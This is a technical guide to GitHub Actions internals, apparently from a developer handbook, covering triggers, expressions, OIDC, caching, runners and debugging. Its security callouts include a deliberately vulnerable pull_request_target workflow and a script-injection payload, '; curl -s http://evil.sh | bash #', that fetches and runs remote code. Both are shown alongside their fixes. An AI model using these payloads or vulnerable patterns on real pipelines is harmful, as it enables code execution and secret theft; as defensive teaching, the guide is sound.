---
title: "GitHub Actions Deep Dive"
description: The advanced mechanics behind a K8s app team's pipeline — trigger semantics, contexts and expressions, script-injection and OIDC security, caching, ARC runners, and debugging.
keywords:
  - pull_request_target script injection exfiltration
  - github.event.pull_request.title run step injection
  - oidc id-token write keyless cloud login
  - pin actions full commit sha supply chain
  - actions-runner-controller ephemeral runner pods
  - no runner matching labels job queued forever
  - actions/cache restore-keys hashfiles layering
  - upload-artifact v4 v3 deprecated
  - ACTIONS_STEP_DEBUG runner debug logging
  - environment required reviewers wait timer
  - concurrency cancel-in-progress prod deploy
  - workflow_run chaining schedule cron
sidebar:
  order: 2
---

[GitHub Actions for K8s App Teams](/ci/github-actions/) is the foundations: workflow anatomy, the four triggers you actually use, least-privilege `GITHUB_TOKEN`, and the complete annotated build-test-push pipeline for `orders-api`. Read it first — this page assumes you already have a working `ci.yml` and now want to understand the machinery *underneath* it, because that machinery is where the security incidents live.

This is the deep dive on the five things the foundations page only had room to gesture at: **trigger semantics** (and the one trigger that hands your secrets to strangers), **contexts and expressions** (and the injection bug hiding in `${{ }}`), **permissions and OIDC** (keyless auth, done right), **caching and artifacts** (and the "green but stale" trap), and **runners** (including the ones the platform team runs as pods in your cluster). The [reusable-workflows](/ci/reusable-workflows/) article covers *reuse* mechanisms; this one covers *mechanics*. Minimal overlap by design.

## Triggers, precisely

The foundations page named four triggers. There are more, and the differences between them are almost entirely about **what context and secrets the run receives** — which is the same thing as **how much a malicious actor can steal**. Learn the trigger table as a security table, because that's what it is.

| Trigger | Fires on | Gets secrets? | Token default | Risk |
| --- | --- | --- | --- | --- |
| `push` | Commits to branches/tags you control | Yes | Read/write per settings | Low — you control the code |
| `pull_request` | PR opened/updated (incl. forks) | **No** for fork PRs; read-only token | `contents: read` | Low — untrusted code, no secrets |
| `pull_request_target` | Same events as `pull_request` | **Yes** — base repo's secrets | Read/write | **High** — see below |
| `workflow_dispatch` | Manual "Run workflow" button/API | Yes | Per settings | Low — human-gated |
| `workflow_call` | Called by another workflow | Passed explicitly by caller | Caller's, capped | Depends on caller |
| `workflow_run` | Another workflow completed | Yes | Per settings | Medium — can run on fork-triggered data |
| `schedule` | Cron, on the default branch | Yes | Per settings | Low — no external input |

**Filters** narrow *push* and *pull_request* so you don't burn runner minutes on irrelevant changes:

```yaml
on:
  push:
    branches: [main]
    tags: ["v*.*.*"]
    paths: ["app/**", "charts/**"]          # skip doc-only commits
  pull_request:
    branches: [main]                        # PRs targeting main only
    paths-ignore: ["**.md", "docs/**"]      # inverse filter
```

A subtlety that bites: `paths`/`paths-ignore` filters make a workflow *not run at all* for filtered changes. If that workflow is a **required status check**, a doc-only PR now waits forever for a check that will never report. The fix is a companion workflow of the same name that returns success for the filtered case, or dropping the path filter on required checks. This is the number-one "why is my PR stuck" cause after fork-secret rules.

### `pull_request_target`: the exfiltration vector

The foundations page flagged this as a foot-gun. Here is the whole mechanism, because you will eventually be tempted.

A `pull_request` run from a fork gets **no secrets** and a **read-only token** — GitHub's deliberate defense, because the code under test is written by a stranger. `pull_request_target` fires on the same events but runs in the **base repository's context**: your secrets are present, the token can write, and — the trap — the workflow file that runs is the one on your *base* branch, not the PR's. That sounds safe ("they can't edit the workflow"), and it's exactly what makes it dangerous, because people reach for it precisely to get secrets into fork-PR CI, and then check out the PR's code:

:::danger[The classic `pull_request_target` exfiltration]
```yaml
# DANGEROUS — do not copy
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@... 
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # <-- checks out UNTRUSTED code
      - run: mvn -B verify                                  # runs the PR's build plugins/tests
        env:
          ARTIFACTORY_TOKEN: ${{ secrets.ARTIFACTORY_TOKEN }}
```
An external contributor opens a PR whose `pom.xml` adds a build plugin (or a test) that reads `ARTIFACTORY_TOKEN` and POSTs it to their server. Your secret, their pocket — and the run is green. Nearly every "GitHub Actions secrets exfiltration" writeup starts here.
:::

When is it *legitimately* needed? Only when you must do something privileged in response to a fork PR **without running the PR's code** — labeling, posting a triage comment, updating a project board. The safe pattern: never `checkout` the PR head under `pull_request_target`; if you must (e.g., to lint the diff), split into two workflows — an untrusted `pull_request` job that builds an artifact with *no* secrets, and a separate `workflow_run` job that consumes that artifact with secrets but never executes fork code. For an internal repo where every contributor pushes branches (not forks), you don't need `pull_request_target` at all — regular `pull_request` already gets secrets on branch pushes.

### `workflow_dispatch`, `workflow_run`, `schedule`

**`workflow_dispatch`** is the manual trigger, and it takes **typed inputs** — a real form in the Actions UI:

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [dev, staging, prod]
        default: dev
      redeploy-digest:
        description: Existing image digest to redeploy (no rebuild)
        type: string
        required: true
      dry-run:
        type: boolean
        default: true
```

Inputs land in `github.event.inputs.*` (and `inputs.*`). This is how you build a "redeploy a known-good digest" button that never rebuilds — the [pipeline contract's](/operations/cicd-pipeline-design/) immutability rule, exposed as an operator control.

**`workflow_run`** chains workflows: "when *CI* completes, run *this*." It's the sanctioned way to give a fork-triggered run privileged follow-up work, because the second workflow runs in your context on your default branch's code. It's also how you post a status back after a required scan finishes.

**`schedule`** is cron, in UTC, always on the **default branch**:

```yaml
on:
  schedule:
    - cron: "17 6 * * 1-5"   # 06:17 UTC, Mon–Fri — nightly dependency/security sweep
```

Use an off-round minute (`17`, not `00`): the top of the hour is the most contended slot on GitHub's scheduler, and scheduled runs on a busy platform can be delayed or dropped under load. Scheduled runs also stop firing on repos with 60 days of no activity — a real gotcha for a security cron on a mature, stable service.

## Contexts and expressions

Everything dynamic in a workflow is a context read inside `${{ }}`. The ones you'll use:

| Context | Holds | Typical use |
| --- | --- | --- |
| `github` | Event payload, ref, sha, actor, repository | `github.ref`, `github.event_name`, `github.sha` |
| `env` | Env vars in scope | `${{ env.IMAGE }}` |
| `vars` | Org/repo/environment **variables** (non-secret config) | `${{ vars.DEFAULT_JAVA }}` |
| `secrets` | Encrypted secrets | `${{ secrets.ARTIFACTORY_TOKEN }}` |
| `needs` | Outputs of upstream jobs | `${{ needs.build.outputs.digest }}` |
| `matrix` | Current matrix values | `${{ matrix.java }}` |
| `job` / `runner` | Current job status, runner OS/arch/temp | `${{ runner.os }}`, `${{ job.status }}` |

Expressions support operators and a small function set: `contains()`, `startsWith()`, `endsWith()`, `hashFiles()`, `fromJSON()`, `toJSON()`, `format()`, and the status checks `success()`, `failure()`, `always()`, `cancelled()`. Two patterns earn their keep:

```yaml
    # Only run on main pushes, not PRs or tags
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'

    # Turn a JSON string into a real matrix (dynamic fan-out)
    strategy:
      matrix: ${{ fromJSON(needs.discover.outputs.services) }}
```

`hashFiles('**/pom.xml')` is the cache-key primitive — it hashes matched files so a key changes exactly when inputs change. `fromJSON`/`toJSON` are how you pass structured data between jobs (a job output is a string; encode with `toJSON`, decode with `fromJSON`).

**`${{ }}` vs run-step env is not cosmetic — it's the security boundary.** A `${{ }}` expression is evaluated by the runner and **textually substituted into the script before the shell ever sees it**. A `$VAR` is read by the shell at runtime from the environment. That difference is the whole of the next section.

### Script injection: the `${{ }}` that runs code

:::danger[Untrusted input interpolated into `run:` is remote code execution]
```yaml
# VULNERABLE
- run: |
    echo "Building PR: ${{ github.event.pull_request.title }}"
```
The PR title is attacker-controlled. Substitution happens *before* bash runs, so a PR titled:

```
"; curl -s http://evil.sh | bash #
```

produces the literal script `echo "Building PR: "; curl -s http://evil.sh | bash #"` — and your runner executes it, with whatever token and secrets that job holds. The same hole exists in `github.head_ref` (branch name), `github.event.issue.body`, `github.event.comment.body`, `github.event.pull_request.body`, and any other field a stranger can type into.
:::

The fix is mechanical and absolute: **never inline untrusted `${{ }}` into a `run:` script.** Pass it through an environment variable and reference the *shell* variable, quoted:

```yaml
# SAFE
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}   # value assigned, not injected as code
  run: |
    echo "Building PR: $PR_TITLE"                        # bash reads it as data, quoted
```

Now the title is data in an env var; bash never parses it as script. The rule generalizes: expressions are safe in `with:`, `env:`, and `if:` (structured fields), and dangerous the instant they touch a `run:` body. When in doubt, bind to `env:` and quote.

## Jobs, the DAG, and concurrency

Jobs run in parallel unless `needs:` orders them. `needs` does two things: sequences jobs and **carries their `outputs`**. That's the data channel between jobs, since each job is a fresh runner with no shared filesystem.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - id: build
        run: echo "digest=sha256:abc..." >> "$GITHUB_OUTPUT"

  publish-chart:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "chart references ${{ needs.build.outputs.digest }}"
```

A **matrix** fans one job into many. `include` adds/extends specific combinations, `exclude` removes them, `fail-fast: false` lets every leg finish (you want the full failure picture, not the first red), and `max-parallel` throttles when a matrix leg is expensive or hits a rate-limited dependency:

```yaml
  test:
    strategy:
      fail-fast: false
      max-parallel: 3
      matrix:
        java: ["21", "25"]
        os: [ubuntu-latest]
        include:
          - java: "21"
            os: ubuntu-latest
            coverage: true      # extra field, only on this leg
        exclude:
          - java: "25"          # drop a combo that isn't ready
            os: ubuntu-latest
```

Matrix is **fan-out**; a job that `needs:` all matrix legs is **fan-in** (it runs once, after every leg). Keep matrixing the *tests*, not the shipped image — one commit, one image, per the [immutability contract](/operations/cicd-pipeline-design/).

**Concurrency groups** serialize or cancel overlapping runs:

```yaml
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
```

:::caution[Never `cancel-in-progress` on a production deploy]
On PRs, cancelling superseded builds is pure savings. On a **deploy** job, `cancel-in-progress: true` can kill a `helm upgrade` or a GitOps commit halfway through, leaving a partially-rolled deployment or a half-written manifest. For deploy jobs use a concurrency group *without* cancellation — new deploys **queue** behind the running one instead of murdering it. Serialize prod; never race it.
:::

For a one-line comparison you'll need constantly: a **composite action** shares a *step sequence* inside one of your jobs (it can't set job-level permissions, runner, or `environment:`); a **reusable workflow** shares *whole jobs* with their own runners and permissions. Depth, versioning, and the paved-road pattern are in [Reusable Workflows](/ci/reusable-workflows/).

## Permissions and OIDC

### Least-privilege `GITHUB_TOKEN`

Every job gets an auto-minted, repo-scoped `GITHUB_TOKEN` that dies with the job. Its default scope is an org setting, and on too many orgs it's still write-everything. Set a workflow-level floor of nothing-but-read and elevate per job:

```yaml
permissions:
  contents: read          # workflow-wide floor

jobs:
  build:
    runs-on: ubuntu-latest
    # inherits contents: read — building needs no more

  comment:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write   # ONLY this job can post a comment
```

Every third-party action in a job can read that job's token. `contents: read` means a compromised action reads your (already-visible) code; `contents: write` means it can push to `main`. The elevation shows up in a diff a reviewer sees — that visibility *is* the control.

### OIDC: keyless auth, and why it wins

The static-token pattern (`ARTIFACTORY_TOKEN` in secrets) parks a long-lived credential in GitHub — the exact thing to stop creating. **OIDC** replaces it with short-lived, federated credentials and no stored secret at all.

The trust flow, concretely:

1. The job requests an OIDC token by declaring `permissions: id-token: write`.
2. GitHub's issuer (`token.actions.githubusercontent.com`) mints a **signed JWT** carrying claims: `repository`, `ref`, `environment`, `job_workflow_ref`, and a `sub` like `repo:acme/orders-api:ref:refs/heads/main`.
3. The workflow presents that JWT to the cloud/registry.
4. The provider **verifies the signature against GitHub's public keys** and checks the claims against a trust policy you configured — "only `sub = repo:acme/orders-api:ref:refs/heads/main` may assume this role."
5. If the claims match, the provider mints **short-lived** credentials (minutes), scoped to exactly what that identity may do.

```yaml
permissions:
  id-token: write     # allow requesting the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@... # pinned by SHA
        with:
          role-to-assume: arn:aws:iam::123456789012:role/orders-api-ci
          aws-region: us-east-1
          # no access key, no secret key — the OIDC JWT is the credential
```

Why it beats stored keys: there is **no secret to leak, rotate, or exfiltrate**; the credential lives for minutes, not months; and the trust is **auditable config** (a claim-matching policy) instead of a value in a vault. A stolen static token is valid until someone notices and rotates it; a stolen OIDC-minted credential expires before an attacker finishes reading it, and can't be re-minted without matching `repo` and `ref` claims. The same federation targets Artifactory via identity mappings — the setup is platform-team work, which is why it usually arrives through [the reusable workflow](/ci/reusable-workflows/) rather than per-repo effort.

### Secret scopes and masking

| Scope | Set where | Visible to | Use for |
| --- | --- | --- | --- |
| **Organization** | Org settings, repo-allowlisted | Selected repos | Shared platform creds (Artifactory, when not OIDC) |
| **Repository** | Repo settings | All that repo's workflows | Genuinely app-specific keys |
| **Environment** | Attached to a named environment | Jobs declaring `environment: X`, **after protection rules pass** | Prod-only creds behind an approval gate |

Any secret value that appears in logs is **masked** (`***`) automatically — but masking is a safety net, not a strategy. It only masks exact known values; a secret you base64 or slice before printing sneaks through. Don't `echo` secrets, and don't build strings out of them.

## Hardening checklist

| Control | What / why |
| --- | --- |
| **Pin actions by full commit SHA** | `@v4` is a moving tag its owner (or an attacker who takes their account) can repoint at code that runs with your token. `@<40-char-sha>` is content-addressed. Comment the version; let Renovate/Dependabot bump it. |
| **Least-privilege `permissions:`** | Floor at `contents: read`; elevate per job. Default read-all is still write-all on many orgs — set it explicitly. |
| **`harden-runner` egress policy** | StepSecurity's `step-security/harden-runner` monitors/blocks runner network egress, so an injected step can't quietly phone home. Set `egress-policy: audit` first, then `block` with an allowlist. |
| **Avoid `pull_request_target`** | And if unavoidable, never `checkout` PR head under it. |
| **`dependency-review-action` on PRs** | Fails the PR if it introduces a dependency with a known vuln or bad license — before it merges. |
| **Never `echo` secrets** | Masking is best-effort; transforms defeat it. |
| **Artifact/log hygiene** | Don't upload `.env`, kubeconfigs, or `~/.m2/settings.xml` in `upload-artifact`. Scope `path:` narrowly. |
| **No self-hosted runners on public repos** | See Runners, below — this one is non-negotiable. |

This is the CI-specific slice of [Supply Chain Security](/operations/supply-chain-security/), whose recurring theme — identity over shared secrets, provenance over trust — this whole page keeps re-deriving.

## Caching and artifacts

**Caches** persist derived state (dependencies, build layers) between runs; **artifacts** persist run *outputs* (reports, packages) after the runner dies. Different tools, different lifetimes — don't confuse them.

`actions/cache` keys on content, with `restore-keys` as an ordered fallback:

```yaml
      - uses: actions/cache@... # pinned
        with:
          path: ~/.m2/repository
          key: m2-${{ runner.os }}-${{ hashFiles('**/pom.xml') }}
          restore-keys: |
            m2-${{ runner.os }}-
```

On an exact `key` hit, the cache restores and no download happens. On a miss, `restore-keys` prefix-matches the **most recent** older cache (a partial `~/.m2` from a prior pom), and Maven downloads only the delta. Caches are **immutable once written** for a key — you cannot overwrite a key, only create new ones — and evicted by **LRU** past the repo's ~10 GB ceiling, and (a real surprise) a cache written on a branch **cannot be read by other branches** except the default branch, which all branches can read. That scoping is why a feature branch sometimes "has no cache" on its first run.

**Docker layer caching** with buildx uses the same backend or a registry:

```yaml
      - uses: docker/build-push-action@... # pinned
        with:
          cache-from: type=gha
          cache-to: type=gha,mode=max        # export intermediate stages too
          # or, for cross-repo/persistent cache:
          # cache-from: type=registry,ref=acme.jfrog.io/docker-local/orders-api:buildcache
          # cache-to:   type=registry,ref=acme.jfrog.io/docker-local/orders-api:buildcache,mode=max
```

`type=gha` uses the Actions cache (subject to the 10 GB LRU); `type=registry` stores the cache as an image in Artifactory, surviving eviction and shared across runners and repos — worth it for a slow multi-stage build.

**Artifacts** outlive the runner:

```yaml
      - uses: actions/upload-artifact@... # v4, pinned
        if: always()                       # upload reports even when tests failed
        with:
          name: surefire-reports
          path: app/target/surefire-reports/
          retention-days: 7
```

:::caution[`upload-artifact`/`download-artifact` v3 is deprecated — use v4]
The v3 artifact actions are deprecated and being retired; migrate to **v4**, which is faster and immutable-per-name but is **not cross-compatible** with v3 (you can't `download-artifact@v4` an artifact uploaded by v3, and each name can be uploaded only once per run). Update upload and download together.
:::

**The "green but cached-stale" trap.** A cache key that's too coarse can serve stale content and still pass. Classic case: caching a *build output directory* keyed only on `runner.os`, so a source change reuses a stale compiled artifact and tests run against old code — green, wrong. Rules: cache **inputs** (dependencies, layers), not **outputs** (`target/`, compiled classes); and always include a content hash (`hashFiles`) in the key so it invalidates when inputs change. A cache that never misses is a cache that's lying.

## Runners

**GitHub-hosted** runners (`runs-on: ubuntu-latest`) are ephemeral VMs with a real Docker daemon — which is what makes buildx, testcontainers, and k3d work in CI ([Testing in CI](/ci/testing-in-ci/)). Destroyed after the job; state survives only in caches and artifacts. That clean-slate guarantee is a feature.

**Self-hosted** runners are machines you (or the platform team) register. At enterprise scale the modern form is **Actions Runner Controller (ARC)**: a Kubernetes operator the platform team deploys that runs **ephemeral runners as pods**, scaled by queue depth. Each job gets a fresh pod that's destroyed afterward — the hosted-runner cleanliness model, but *inside your cluster*, next to Artifactory and behind the firewall. That network position is often the whole point: on GitHub Enterprise with a private Artifactory, ARC runners may be the *only* ones that can reach the registry at all, and Maven pulls and image pushes move at datacenter speed. This is squarely platform-team territory — runners execute arbitrary workflow code, so their images, privileges, and network policy are security surface, not an app-team hobby. See [working with the platform team](/operations/working-with-platform-team/) for how to request labels and reason about the boundary.

You select runners by **label**:

```yaml
    runs-on: [self-hosted, linux, arc-arm64]   # all labels must match
```

:::note[Symptom: a job queued forever, no logs]
`runs-on:` labels are matched, not fuzzy. If **no runner matches every label** — a typo (`arc-arm-64`), a decommissioned label, a scaled-to-zero ARC pool that isn't waking — the job sits **queued indefinitely** with no error, because GitHub is patiently waiting for a runner that will never appear. Check the labels against what the platform actually offers before assuming capacity. This is the most common "my pipeline hangs" report on self-hosted fleets.
:::

:::danger[Never use self-hosted runners on public repositories]
A `pull_request` from a fork runs the PR's code. On a hosted runner that's a throwaway VM; on **your** self-hosted runner it's **arbitrary code execution on your infrastructure**, with whatever network access and persistence that machine has. Any stranger who opens a PR gets a shell on your fleet. Self-hosted runners are for private/internal repos only. Full stop.
:::

## Environments and deployment protection

An `environment:` is more than a label — it's the **human-approval gate** that separates CI (build the artifact) from CD (release it). Attach protection rules and a job that names the environment **pauses until they pass**:

- **Required reviewers** — the job waits in the UI until a named person/team clicks approve.
- **Wait timer** — a mandatory delay (e.g., 10 min) before the job proceeds, a soak/abort window.
- **Deployment branch/tag policies** — only `main` (or `v*.*.*` tags) may deploy to this environment.

```yaml
  promote-prod:
    needs: build
    environment: production        # gate: reviewers + prod-scoped secrets live here
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/bump-gitops.sh ${{ needs.build.outputs.digest }}
        env:
          GITOPS_TOKEN: ${{ secrets.GITOPS_TOKEN }}   # only exists in the production environment
```

Environment secrets are released **only** to a job that declares that environment, **and** only after its protection rules pass — so the approval gates the *reference to* an already-built artifact, never a rebuild. This is [CI/CD pipeline design's](/operations/cicd-pipeline-design/) "humans approve promotion, not construction" rule expressed in GitHub primitives.

## Debugging failed (and non-triggering) workflows

Re-running comes in two flavors: **re-run all jobs** (fresh everything) and **re-run failed jobs only** (keeps successful jobs' results — faster, and preserves the passing context). Reach for "failed only" first.

When a log doesn't say enough, turn on **step debug logging**: set repo/org **variables** (or secrets) `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`, then re-run. Every step then emits its internal decisions — cache-key computation, expression evaluation, why an `if:` skipped a step. Most "why did the cache miss" and "why did this step skip" mysteries die here.

Other tools:

- **`timeout-minutes`** on jobs/steps — a hung step (a wedged testcontainer, a network stall) otherwise burns the full 6-hour job limit before failing. Cap it.
- **`tmate`** (`mxschmitt/action-tmate`) — opens an interactive SSH session *into the runner mid-run* so you can poke around live. Gate it behind `if: failure()` and a `workflow_dispatch` input; never leave it always-on (it holds the runner and can expose it).
- **`act`** (`nektos/act`) — runs workflows locally in containers for fast YAML/wiring iteration. Not the real environment: different runner images, no OIDC, no real secrets, no `environment:` gates. Trust it for structure, never for a final verdict.
- **`::error::` / annotations** — `echo "::error file=app/pom.xml,line=12::message"` surfaces an annotation on the run summary and in the PR diff, so failures point at a location instead of hiding in logs.

The hardest bug is **"why did this not trigger at all?"** — no run, no log to read:

| Symptom | Likely cause |
| --- | --- |
| No run on a doc-only PR | `paths`/`paths-ignore` filter excluded it (and if it's a required check, the PR is now stuck) |
| No run on a fork PR's later push | Some events only fire for the PR author's first push, or the repo requires approval to run fork workflows |
| Secrets empty in a fork PR | Working as designed — `pull_request` from forks gets no secrets; you may want the `pull_request` + `workflow_run` split |
| Scheduled workflow silent | Cron is UTC; scheduled runs pause after 60 days of repo inactivity; top-of-hour slots get delayed |
| `workflow_dispatch` button missing | The workflow with `workflow_dispatch` must exist on the **default branch** to show the button |
| Job queued forever | No self-hosted runner matches every `runs-on:` label (see Runners) |
| Push to a new branch didn't build | `branches:` filter didn't include it, or `on: push` was scoped to `main` only |

The anti-habit, worth naming: re-running without reading, and the retry that "fixes" it by accident. A flaky pipeline teaches the team to ignore red, and ignoring red is how a broken image reaches Artifactory.

## The 10-line secure workflow skeleton

A copy-paste starting point that bakes in least-privilege permissions, SHA-pinned actions, OIDC, and safe concurrency — fill in the build:

```yaml
name: ci
on:
  pull_request:
  push: { branches: [main], tags: ["v*.*.*"] }
permissions:
  contents: read          # least-privilege floor; elevate per job
  id-token: write         # OIDC — no long-lived registry secret
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}   # never cancel main
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2 — pin by SHA
      # ... build, test, OIDC login, push by digest ...
```

From here, the natural next reads: the annotated end-to-end pipeline in [GitHub Actions for K8s App Teams](/ci/github-actions/), how to stop every repo maintaining its own copy in [Reusable Workflows and Templates](/ci/reusable-workflows/), and where all these pushes land in [Artifactory as the Artifact Hub](/ci/artifactory/).
